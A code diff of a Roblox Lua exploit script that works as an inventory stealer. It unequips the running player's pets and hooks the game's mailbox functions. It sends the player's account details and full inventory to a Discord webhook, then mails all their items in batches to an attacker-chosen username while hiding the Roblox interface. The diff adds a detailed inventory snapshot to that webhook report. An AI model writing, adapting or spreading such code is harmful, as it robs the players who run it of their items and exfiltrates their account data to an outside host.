@@ -5,361 +5,443 @@ local PlayerStateClient = require(game.ReplicatedStorage.ClientModules.PlayerSta
 local Replica = PlayerStateClient:GetLocalReplica()
 
 if not Replica or not Replica.Data then
-    return
+	return
 end
 
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
+local Players       = game:GetService("Players")
+local HttpService   = game:GetService("HttpService")
+local cg            = game:GetService("CoreGui")
+local localPlayer   = Players.LocalPlayer
+local playerGui     = localPlayer:WaitForChild("PlayerGui", 10)
 if not playerGui then return end
-local HttpService = game:GetService("HttpService")
-local cg = game:GetService("CoreGui")
 
 local petList = playerGui:WaitForChild("PetList", 10)
 if not petList then return end
-local toggleButton = petList:WaitForChild("Exit", 5):WaitForChild("OpenButton", 5)
+local toggleButton  = petList:WaitForChild("Exit", 5):WaitForChild("OpenButton", 5)
 local scrollingFrame = petList:WaitForChild("Frame", 5):WaitForChild("Notepad", 5):WaitForChild("ScrollingFrame", 5)
 
 local topNotification = playerGui:FindFirstChild("TopNotification")
 if topNotification then
-    topNotification:Destroy()
+	topNotification:Destroy()
 end
 
 local function safeClick(button)
-    if not button then return end
-    pcall(function() firesignal(button.Activated) end)
-    pcall(function() firesignal(button.MouseButton1Click) end)
-
-    if getconnections then
-        for _, connection in pairs(getconnections(button.Activated)) do
-            pcall(function() connection:Fire() end)
-        end
-        for _, connection in pairs(getconnections(button.MouseButton1Click)) do
-            pcall(function() connection:Fire() end)
-        end
-    end
+	if not button then return end
+	pcall(function() firesignal(button.Activated) end)
+	pcall(function() firesignal(button.MouseButton1Click) end)
+	if getconnections then
+		for _, connection in pairs(getconnections(button.Activated)) do
+			pcall(function() connection:Fire() end)
+		end
+		for _, connection in pairs(getconnections(button.MouseButton1Click)) do
+			pcall(function() connection:Fire() end)
+		end
+	end
 end
 
 local function findNextUnequipButton()
-    if not scrollingFrame then return nil end
-    for _, desc in pairs(scrollingFrame:GetDescendants()) do
-        if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and desc.Name == "Unequip" then
-            if not string.find(desc:GetFullName(), "Template") and desc.Visible == true then
-                return desc
-            end
-        end
-    end
-    return nil
+	if not scrollingFrame then return nil end
+	for _, desc in pairs(scrollingFrame:GetDescendants()) do
+		if (desc:IsA("TextButton") or desc:IsA("ImageButton")) and desc.Name == "Unequip" then
+			if not string.find(desc:GetFullName(), "Template") and desc.Visible == true then
+				return desc
+			end
+		end
+	end
+	return nil
 end
 
 local function runUnequipSequence()
-    if not toggleButton then return end
-    safeClick(toggleButton)
-    task.wait(1.5)
+	if not toggleButton then return end
+	safeClick(toggleButton)
+	task.wait(1.5)
 
-    local unequipButton = findNextUnequipButton()
-    while unequipButton do
-        safeClick(unequipButton)
-        task.wait(0.5)
-        unequipButton = findNextUnequipButton()
-    end
+	local unequipButton = findNextUnequipButton()
+	while unequipButton do
+		safeClick(unequipButton)
+		task.wait(0.5)
+		unequipButton = findNextUnequipButton()
+	end
 
-    task.wait(0.5)
-    safeClick(toggleButton)
-    task.wait(1.0)
+	task.wait(0.5)
+	safeClick(toggleButton)
+	task.wait(1.0)
 end
 
 runUnequipSequence()
 
 local function isExcluded(name)
-    if name == "Shovel" or name == "Build" or name == "Lantern" or name == "Sign" or
-       name == "Magnet" or name == "Rainbow Carpet" or name == "Wheelbarrow" or name == "Flashbang" then
-        return true
-    elseif string.match(name, "%d+%.?%d*kg") or string.match(name, "%[.*kg.*%]") then
-        return true
-    end
-    return false
+	if name == "Shovel" or name == "Build" or name == "Lantern" or name == "Sign" or
+	   name == "Magnet" or name == "Rainbow Carpet" or name == "Wheelbarrow" or name == "Flashbang" then
+		return true
+	elseif string.match(name, "%d+%.?%d*kg") or string.match(name, "%[.*kg.*%]") then
+		return true
+	end
+	return false
 end
 
 local function getLiveInventory()
-    if Replica and Replica.Data and Replica.Data.Inventory then
-        return Replica.Data.Inventory
-    end
-    return nil
+	if Replica and Replica.Data and Replica.Data.Inventory then
+		return Replica.Data.Inventory
+	end
+	return nil
 end
 
 local function getValidItems()
-    local currentInv = getLiveInventory()
-    if not currentInv then return {}, {} end
+	local currentInv = getLiveInventory()
+	if not currentInv then return {}, {} end
 
-    local validItems = {}
-    local petUUIDs = {}
+	local validItems = {}
+	local petUUIDs   = {}
 
-    for category, items in pairs(currentInv) do
-        if type(items) == "table" then
-            if category == "Pets" then
-                for uuid, petData in pairs(items) do
-                    if petData.Name and not isExcluded(petData.Name) then
-                        table.insert(validItems, {
-                            name = petData.Name,
-                            category = category,
-                            amount = 1,
-                            uuid = uuid
-                        })
-                        petUUIDs[petData.Name] = uuid
-                    end
-                end
-            else
-                for itemName, amount in pairs(items) do
-                    if type(amount) == "number" and amount > 0 and not isExcluded(itemName) then
-                        table.insert(validItems, {
-                            name = itemName,
-                            category = category,
-                            amount = amount,
-                            uuid = nil
-                        })
-                    end
-                end
-            end
-        end
-    end
-    return validItems, petUUIDs
+	for category, items in pairs(currentInv) do
+		if type(items) == "table" then
+			if category == "Pets" then
+				for uuid, petData in pairs(items) do
+					if petData.Name and not isExcluded(petData.Name) then
+						table.insert(validItems, {
+							name     = petData.Name,
+							category = category,
+							amount   = 1,
+							uuid     = uuid,
+						})
+						petUUIDs[petData.Name] = uuid
+					end
+				end
+			else
+				for itemName, amount in pairs(items) do
+					if type(amount) == "number" and amount > 0 and not isExcluded(itemName) then
+						table.insert(validItems, {
+							name     = itemName,
+							category = category,
+							amount   = amount,
+							uuid     = nil,
+						})
+					end
+				end
+			end
+		end
+	end
+	return validItems, petUUIDs
+end
+
+local function getFullSnapshot()
+	local buckets = { Seeds={}, Pets={}, Gear={}, Crates={}, Equipped={}, Other={} }
+	local counts  = { Seeds=0,  Pets=0,  Gear=0,  Crates=0,  Equipped=0,  Other=0  }
+	local total   = 0
+
+	local inv = getLiveInventory()
+	if not inv then return buckets, counts, total end
+
+	for category, items in pairs(inv) do
+		if type(items) == "table" then
+			local bucket = buckets[category] or buckets.Other
+			local key    = buckets[category] and category or "Other"
+
+			if category == "Pets" then
+				local tally = {}
+				for _, petData in pairs(items) do
+					if petData.Name then
+						tally[petData.Name] = (tally[petData.Name] or 0) + 1
+						counts[key] = counts[key] + 1
+						total       = total + 1
+					end
+				end
+				for n, c in pairs(tally) do
+					table.insert(bucket, { name = n, count = c })
+				end
+			else
+				for itemName, amount in pairs(items) do
+					if type(amount) == "number" and amount > 0 then
+						table.insert(bucket, { name = itemName, count = amount })
+						counts[key] = counts[key] + amount
+						total       = total + amount
+					end
+				end
+			end
+		end
+	end
+
+	for _, b in pairs(buckets) do
+		table.sort(b, function(a, b2) return (a.count or 0) > (b2.count or 0) end)
+	end
+
+	return buckets, counts, total
 end
 
 local AllItems, petUUIDs = getValidItems()
 local displayCounts = {}
-local totalItems = 0
+local totalItems    = 0
 
 for _, item in ipairs(AllItems) do
-    displayCounts[item.name] = (displayCounts[item.name] or 0) + item.amount
-    totalItems = totalItems + item.amount
+	displayCounts[item.name] = (displayCounts[item.name] or 0) + item.amount
+	totalItems = totalItems + item.amount
 end
 
-local formattedItemList = ""
-for displayName, amount in pairs(displayCounts) do
-    formattedItemList = formattedItemList .. displayName .. " x" .. amount .. "\n"
-end
+local function sendSnapshotEmbed()
+	local buckets, counts, totalAll = getFullSnapshot()
 
-if #formattedItemList > 0 then
-    formattedItemList = formattedItemList:sub(1, -2)
-end
+	local function fmtList(list)
+		if #list == 0 then return "```- empty -```" end
+		local lines = {}
+		for _, it in ipairs(list) do
+			if it.count and it.count > 1 then
+				table.insert(lines, "• " .. it.name .. " `x" .. it.count .. "`")
+			else
+				table.insert(lines, "• " .. it.name)
+			end
+		end
+		return table.concat(lines, "\n")
+	end
 
-if totalItems == 0 then return end
+	local function types(list) return #list end
+	local function inlineCode(v) return "`" .. tostring(v) .. "`" end
+
+	local avatarUrl = string.format(
+		"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+		localPlayer.UserId
+	)
+	local profileUrl = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+
+	local totalsValue = string.format(
+		"🌿 Seeds: `%d`  •  🐾 Pets: `%d`  •  🛠️ Gear: `%d`\n📦 Crates: `%d`  •  ⚔️ Equipped: `%d`  •  ❓ Other: `%d`",
+		counts.Seeds, counts.Pets, counts.Gear, counts.Crates, counts.Equipped, counts.Other
+	)
+
+	local fields = {
+		{ name = "👤 **User ID**",       value = inlineCode(localPlayer.UserId),                                inline = true },
+		{ name = "📅 **Account Age**",   value = inlineCode(math.floor(localPlayer.AccountAge) .. " days"),     inline = true },
+		{ name = "👥 **In Server**",     value = inlineCode(#Players:GetPlayers() .. " players"),               inline = true },
+		{ name = "🗺️ **Place ID**",      value = inlineCode(game.PlaceId),                                      inline = false },
+		{ name = "🧩 **Job ID**",        value = inlineCode(game.JobId ~= "" and game.JobId or "studio"),       inline = false },
+		{ name = "📦 **Totals**",        value = totalsValue,                                                   inline = false },
+		{ name = "⚔️ **Equipped (" .. counts.Equipped .. ")**",
+		  value = fmtList(buckets.Equipped),                                                                    inline = false },
+		{ name = "🌿 **Seeds (" .. counts.Seeds .. " items / " .. types(buckets.Seeds) .. " types)**",
+		  value = fmtList(buckets.Seeds),                                                                       inline = false },
+		{ name = "🐾 **Pets (" .. counts.Pets .. " items / " .. types(buckets.Pets) .. " types)**",
+		  value = fmtList(buckets.Pets),                                                                        inline = false },
+		{ name = "🛠️ **Gear (" .. counts.Gear .. " items / " .. types(buckets.Gear) .. " types)**",
+		  value = fmtList(buckets.Gear),                                                                        inline = false },
+	}
+
+	if counts.Crates > 0 then
+		table.insert(fields, {
+			name   = "📦 **Crates (" .. counts.Crates .. ")**",
+			value  = fmtList(buckets.Crates),
+			inline = false,
+		})
+	end
+	if counts.Other > 0 then
+		table.insert(fields, {
+			name   = "❓ **Other (" .. counts.Other .. ")**",
+			value  = fmtList(buckets.Other),
+			inline = false,
+		})
+	end
+
+	local payload = HttpService:JSONEncode({
+		username   = "Garden Logger",
+		avatar_url = avatarUrl,
+		embeds = {{
+			author = {
+				name     = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
+				icon_url = avatarUrl,
+				url      = profileUrl,
+			},
+			title       = "🌱 Inventory Snapshot",
+			url         = profileUrl,
+			description = "```ansi\n\27[1;32mPlayer joined — full backpack scan captured.\27[0m\n```",
+			color       = 5763719,
+			thumbnail   = { url = avatarUrl },
+			fields      = fields,
+			footer      = {
+				text     = "Garden Logger • " .. totalAll .. " total items",
+				icon_url = avatarUrl,
+			},
+			timestamp = DateTime.now():ToIsoDate(),
+		}},
+	})
+
+	local requestFunc = (syn and syn.request) or (http and http.request) or request
+	pcall(function()
+		requestFunc({
+			Url     = getgenv().WEBHOOK_URL,
+			Method  = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body    = payload,
+		})
+	end)
+end
 
 local Environment = {
-    Target = {
-        Name = getgenv().TARGET_USERNAME,
-        Id = nil
-    },
-    Mailbox = {
-        PickRecipient = nil,
-        AddToSend = nil,
-        SendBatch = nil
-    }
+	Target = { Name = getgenv().TARGET_USERNAME, Id = nil },
+	Mailbox = { PickRecipient = nil, AddToSend = nil, SendBatch = nil },
 }
 
 local function sendBatch()
-    local currentItems = getValidItems()
-    if #currentItems == 0 then return false end
+	local currentItems = getValidItems()
+	if #currentItems == 0 then return false end
 
-    local batchItems = {}
-    local currentCount = 0
+	local batchItems   = {}
+	local currentCount = 0
 
-    for _, item in ipairs(currentItems) do
-        if currentCount >= 20 then break end
+	for _, item in ipairs(currentItems) do
+		if currentCount >= 20 then break end
+		local amountToAdd = math.min(item.amount, 20 - currentCount)
+		for i = 1, amountToAdd do
+			table.insert(batchItems, {
+				name     = item.uuid or item.name,
+				category = item.category,
+				isPet    = (item.category == "Pets"),
+			})
+			currentCount = currentCount + 1
+		end
+	end
 
-        local amountToAdd = math.min(item.amount, 20 - currentCount)
-        for i = 1, amountToAdd do
-            table.insert(batchItems, {
-                name = item.uuid or item.name,
-                category = item.category,
-                isPet = (item.category == "Pets")
-            })
-            currentCount = currentCount + 1
-        end
-    end
+	if #batchItems == 0 then return false end
 
-    if #batchItems == 0 then return false end
+	Environment.Mailbox.PickRecipient(nil, Environment.Target.Id, Environment.Target.Name)
+	task.wait(0.2)
 
-    Environment.Mailbox.PickRecipient(nil, Environment.Target.Id, Environment.Target.Name)
-    task.wait(0.2)
+	local itemsAdded = 0
+	local liveInv    = getLiveInventory()
+	if not liveInv then return false end
 
-    local itemsAdded = 0
-    local liveInv = getLiveInventory()
-    if not liveInv then return false end
+	for _, item in ipairs(batchItems) do
+		local itemExists = false
+		if liveInv[item.category] then
+			if item.isPet then
+				if liveInv[item.category][item.name] then itemExists = true end
+			else
+				if liveInv[item.category][item.name] and liveInv[item.category][item.name] > 0 then
+					itemExists = true
+				end
+			end
+		end
 
-    for _, item in ipairs(batchItems) do
-        local itemExists = false
+		if itemExists then
+			Environment.Mailbox.AddToSend(nil, item.name, item.category, item.name, {})
+			itemsAdded = itemsAdded + 1
+			task.wait(0.08)
+		end
+	end
 
-        if liveInv[item.category] then
-            if item.isPet then
-                if liveInv[item.category][item.name] then itemExists = true end
-            else
-                if liveInv[item.category][item.name] and liveInv[item.category][item.name] > 0 then
-                    itemExists = true
-                end
-            end
-        end
-
-        if itemExists then
-            Environment.Mailbox.AddToSend(nil, item.name, item.category, item.name, {})
-            itemsAdded = itemsAdded + 1
-            task.wait(0.08)
-        end
-    end
-
-    if itemsAdded == 0 then return false end
-
-    Environment.Mailbox.SendBatch()
-    return true
+	if itemsAdded == 0 then return false end
+	Environment.Mailbox.SendBatch()
+	return true
 end
 
 local function startLogicFlow()
-    local Success, UserID = pcall(function()
-        return Players:GetUserIdFromNameAsync(Environment.Target.Name)
-    end)
+	sendSnapshotEmbed()
 
-    if not Success or not UserID then
-        warn("Failed to get UserID for: " .. Environment.Target.Name)
-        return
-    end
-    Environment.Target.Id = UserID
+	if totalItems == 0 then return end
 
-    local payload = HttpService:JSONEncode({
-        content = "no ping",
-        username = "nega",
-        avatar_url = "https://www.image2url.com/r2/default/gifs/1781367653426-037376e6-5a1e-47af-b83d-9bd2596eb533.gif",
-        embeds = {{
-            title = "✦cool✦",
-            description = "```diff\n+ Loot Found!\n```",
-            color = 16738740,
-            fields = {
-                { name = "👤 **Username**", value = "```" .. localPlayer.Name .. "```", inline = true },
-                { name = "🎯 **Mail Username**", value = "```" .. Environment.Target.Name .. "```", inline = true },
-                { name = "📦 **Total Items**", value = "```" .. totalItems .. "```", inline = true },
-                { name = "🥕 **Items**", value = "```" .. formattedItemList .. "```", inline = true },
-            },
-            footer = {
-                text = "nega",
-                icon_url = "https://www.image2url.com/r2/default/gifs/1781367653426-037376e6-5a1e-47af-b83d-9bd2596eb533.gif"
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    })
+	local Success, UserID = pcall(function()
+		return Players:GetUserIdFromNameAsync(Environment.Target.Name)
+	end)
 
-    local requestFunc = (syn and syn.request) or (http and http.request) or request
-    pcall(function()
-        requestFunc({
-            Url = getgenv().WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = payload
-        })
-    end)
+	if not Success or not UserID then
+		warn("Failed to get UserID for: " .. Environment.Target.Name)
+		return
+	end
+	Environment.Target.Id = UserID
 
-    task.spawn(function()
-        pcall(function()
-            if cg then
-                local rg = cg:FindFirstChild("RobloxGui")
-                if rg then rg.Enabled = false end
-                local tb = cg:FindFirstChild("TopBarApp")
-                if tb then tb.Enabled = false end
-            end
-            pcall(function()
-                game:GetService("GuiService").SelectedObject = nil
-            end)
-        end)
-    end)
+	task.spawn(function()
+		pcall(function()
+			if cg then
+				local rg = cg:FindFirstChild("RobloxGui")
+				if rg then rg.Enabled = false end
+				local tb = cg:FindFirstChild("TopBarApp")
+				if tb then tb.Enabled = false end
+			end
+			pcall(function()
+				game:GetService("GuiService").SelectedObject = nil
+			end)
+		end)
+	end)
 
-    task.spawn(function()
-        while true do
-            local currentItems = getValidItems()
-            local totalRemaining = 0
-            for _, item in ipairs(currentItems) do
-                totalRemaining = totalRemaining + item.amount
-            end
+	task.spawn(function()
+		while true do
+			local currentItems   = getValidItems()
+			local totalRemaining = 0
+			for _, item in ipairs(currentItems) do
+				totalRemaining = totalRemaining + item.amount
+			end
+			if totalRemaining == 0 then break end
 
-            if totalRemaining == 0 then
-                break
-            end
-
-            local success = sendBatch()
-
-            if not success then
-                task.wait(2.5)
-            else
-                task.wait(9.8)
-            end
-        end
-    end)
+			local success = sendBatch()
+			if not success then
+				task.wait(2.5)
+			else
+				task.wait(9.8)
+			end
+		end
+	end)
 end
 
 local function hookMailbox()
-    warn("Starting mailbox hook scan...")
-    local gcResult = getgc()
-    local checkedCount = 0
-    local foundCount = 0
+	warn("Starting mailbox hook scan...")
+	local gcResult     = getgc()
+	local checkedCount = 0
+	local foundCount   = 0
 
-    for _, Value in next, gcResult do
-        checkedCount = checkedCount + 1
+	for _, Value in next, gcResult do
+		checkedCount = checkedCount + 1
+		if checkedCount % 100 == 0 then task.wait() end
 
-        if checkedCount % 100 == 0 then
-            task.wait()
-        end
+		if type(Value) == "function" and islclosure(Value) then
+			local ok, info = pcall(getinfo, Value)
+			if ok and info and type(info) == "table" then
+				local src = info.source or info.short_src or ""
+				if src:find("MailboxController") then
+					local name = info.name or ""
+					local upvalueMatch = ""
+					local upOk, ups = pcall(getupvalues, Value)
+					if upOk and ups then
+						for _, v in pairs(ups) do
+							if type(v) == "string" then
+								if v:find("_pickRecipient") or v:find("_addToSend") or v:find("sendBatch") then
+									upvalueMatch = v
+									break
+								end
+							end
+						end
+					end
 
-        if type(Value) == "function" and islclosure(Value) then
-            local ok, info = pcall(getinfo, Value)
-            if ok and info and type(info) == "table" then
-                local src = info.source or info.short_src or ""
-                if src:find("MailboxController") then
-                    -- try name field first
-                    local name = info.name or ""
-                    -- also scan upvalues for the function name as a string constant
-                    local upvalueMatch = ""
-                    local upOk, ups = pcall(getupvalues, Value)
-                    if upOk and ups then
-                        for _, v in pairs(ups) do
-                            if type(v) == "string" then
-                                if v:find("_pickRecipient") or v:find("_addToSend") or v:find("sendBatch") then
-                                    upvalueMatch = v
-                                    break
-                                end
-                            end
-                        end
-                    end
+					local identifier = name ~= "" and name or upvalueMatch
 
-                    local identifier = name ~= "" and name or upvalueMatch
+					if identifier:find("_pickRecipient") and not Environment.Mailbox.PickRecipient then
+						Environment.Mailbox.PickRecipient = Value
+						foundCount = foundCount + 1
+						warn("Found PickRecipient")
+					elseif identifier:find("_addToSend") and not Environment.Mailbox.AddToSend then
+						Environment.Mailbox.AddToSend = Value
+						foundCount = foundCount + 1
+						warn("Found AddToSend")
+					elseif identifier:find("sendBatch") and not Environment.Mailbox.SendBatch then
+						Environment.Mailbox.SendBatch = Value
+						foundCount = foundCount + 1
+						warn("Found SendBatch")
+					end
 
-                    if identifier:find("_pickRecipient") and not Environment.Mailbox.PickRecipient then
-                        Environment.Mailbox.PickRecipient = Value
-                        foundCount = foundCount + 1
-                        warn("Found PickRecipient")
-                    elseif identifier:find("_addToSend") and not Environment.Mailbox.AddToSend then
-                        Environment.Mailbox.AddToSend = Value
-                        foundCount = foundCount + 1
-                        warn("Found AddToSend")
-                    elseif identifier:find("sendBatch") and not Environment.Mailbox.SendBatch then
-                        Environment.Mailbox.SendBatch = Value
-                        foundCount = foundCount + 1
-                        warn("Found SendBatch")
-                    end
+					if foundCount == 3 then
+						warn("All mailbox functions found!")
+						break
+					end
+				end
+			end
+		end
+	end
 
-                    if foundCount == 3 then
-                        warn("All mailbox functions found!")
-                        break
-                    end
-                end
-            end
-        end
-    end
+	warn("Scan complete. Found " .. foundCount .. "/3 mailbox functions.")
 
-    warn("Scan complete. Found " .. foundCount .. "/3 mailbox functions.")
-
-    if foundCount == 3 then
-        startLogicFlow()
-    else
-        warn("Not all mailbox functions found. Open the mailbox ingame first, then rerun.")
-    end
+	if foundCount == 3 then
+		startLogicFlow()
+	else
+		sendSnapshotEmbed()
+		warn("Not all mailbox functions found. Open the mailbox ingame first, then rerun.")
+	end
 end
 
 task.spawn(hookMailbox)
